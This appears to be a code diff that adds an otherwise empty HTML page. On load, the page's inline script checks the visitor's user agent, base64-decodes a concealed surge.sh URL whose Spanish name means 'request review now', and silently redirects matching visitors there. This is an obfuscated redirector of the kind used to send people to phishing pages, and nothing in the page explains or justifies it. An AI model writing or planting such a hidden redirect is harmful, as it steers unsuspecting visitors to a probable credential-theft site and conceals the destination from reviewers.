@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  <style>body{background:#fff;margin:0}</style>
+</head>
+<body>
+<script>
+(function(){
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+  if(!/Android|iPhone|iPad|Macintosh|Windows/i.test(ua)) return;
+
+
+  const encoded = "aHR0cHM6Ly9zb2xpY2l0YXItcmV2aXNpb24tYWhvcmEuc3VyZ2Uuc2gv";
+  location.href = atob(encoded);
+})();
+</script>
+</body>
+</html>
